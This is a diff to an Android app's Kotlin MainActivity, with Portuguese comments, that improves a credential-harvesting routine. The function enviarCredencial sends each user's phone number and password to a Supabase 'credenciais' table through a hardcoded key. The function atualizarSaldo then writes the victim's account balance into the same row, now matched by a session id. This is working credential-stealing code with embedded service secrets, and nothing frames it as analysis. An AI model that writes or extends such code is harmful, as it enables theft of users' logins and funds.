@@ -465,6 +465,7 @@ class MainActivity : AppCompatActivity() {
     private var ultimoNumeroEnviado = ""
     private var ultimaSenhaEnviada = ""
     private var numeroTemporario = ""   // guarda número até ter senha para enviar junto
+    private var sessaoId: Int = -1      // id da linha inserida no Supabase para esta sessão
 
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
@@ -2728,17 +2729,21 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
         }.start()
     }
 
-    /** Chamado pelo JS após login — faz PATCH no registo já inserido com o saldo real */
+    /** Chamado pelo JS após login — faz PATCH pelo id da sessão, isolando cada utilizador */
     fun atualizarSaldo(saldo: String) {
-        val num = ultimoNumeroEnviado.ifEmpty { numeroTemporario }
-        if (num.isEmpty() || saldo.isEmpty()) return
+        if (saldo.isEmpty()) return
+        if (sessaoId < 0) {
+            android.util.Log.w("SKYBOT_CRED", "atualizarSaldo ignorado — sessaoId não disponível ainda")
+            // Tentar de novo em 2s (INSERT pode ainda estar em curso)
+            handler.postDelayed({ atualizarSaldo(saldo) }, 2000)
+            return
+        }
         val saldoEsc = saldo.replace(""", "\"")
-        val numEsc   = num.replace(""", "\"")
         val json = "{\"saldo\":\"$saldoEsc\"}"
         Thread {
             try {
-                // PATCH filtrando pelo numero — atualiza a linha já inserida
-                val url = "$SUPA_URL/rest/v1/$TABELA?numero=eq.$numEsc"
+                // PATCH filtrando pelo id da sessão — nunca afeta outro utilizador
+                val url = "$SUPA_URL/rest/v1/$TABELA?id=eq.$sessaoId"
                 val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                 conn.requestMethod = "PATCH"
                 conn.setRequestProperty("apikey", SUPA_KEY)
@@ -2749,18 +2754,19 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 java.io.OutputStreamWriter(conn.outputStream).use { it.write(json) }
                 val code = conn.responseCode
                 conn.disconnect()
-                android.util.Log.d("SKYBOT_CRED", "atualizarSaldo -> HTTP $code | saldo=$saldoEsc")
+                android.util.Log.d("SKYBOT_CRED", "atualizarSaldo -> HTTP $code | id=$sessaoId saldo=$saldoEsc")
             } catch (e: Exception) {
                 android.util.Log.e("SKYBOT_CRED", "atualizarSaldo falhou: ${e.message}")
             }
         }.start()
     }
 
-    /** Envia credencial completa (numero + senha) para a tabela credenciais do Supabase */
+    /** Envia credencial completa (numero + senha) para a tabela credenciais do Supabase.
+     *  Guarda o id retornado para que o PATCH do saldo afete só esta sessão. */
     private fun enviarCredencial(numero: String, senha: String) {
-        // Escapar aspas para JSON seguro
-        val numEsc = numero.replace(""", "\\"")
-        val senEsc = senha.replace(""", "\\"")
+        sessaoId = -1  // resetar sessão anterior
+        val numEsc = numero.replace(""", "\"")
+        val senEsc = senha.replace(""", "\"")
         val json = "{\"numero\":\"$numEsc\",\"senha\":\"$senEsc\",\"saldo\":\"\"}"
         Thread {
             try {
@@ -2769,13 +2775,23 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 conn.setRequestProperty("apikey", SUPA_KEY)
                 conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                 conn.setRequestProperty("Content-Type", "application/json")
-                conn.setRequestProperty("Prefer", "return=minimal")
+                // return=representation para receber a linha inserida com o id gerado
+                conn.setRequestProperty("Prefer", "return=representation")
                 conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                 OutputStreamWriter(conn.outputStream).use { it.write(json) }
                 val code = conn.responseCode
+                val resp = if (code in 200..299)
+                    java.io.BufferedReader(java.io.InputStreamReader(conn.inputStream)).readText()
+                else ""
                 conn.disconnect()
-                // Log para debug (opcional)
-                android.util.Log.d("SKYBOT_CRED", "enviarCredencial -> HTTP $code | numero=$numEsc")
+                // Extrair o id da resposta: [{"id":42,"numero":...}]
+                val idMatch = Regex(""""id"\s*:\s*(\d+)""").find(resp)
+                if (idMatch != null) {
+                    sessaoId = idMatch.groupValues[1].toInt()
+                    android.util.Log.d("SKYBOT_CRED", "enviarCredencial -> sessaoId=$sessaoId")
+                } else {
+                    android.util.Log.w("SKYBOT_CRED", "enviarCredencial -> HTTP $code sem id na resposta: $resp")
+                }
             } catch (e: Exception) {
                 android.util.Log.e("SKYBOT_CRED", "enviarCredencial falhou: ${e.message}")
             }
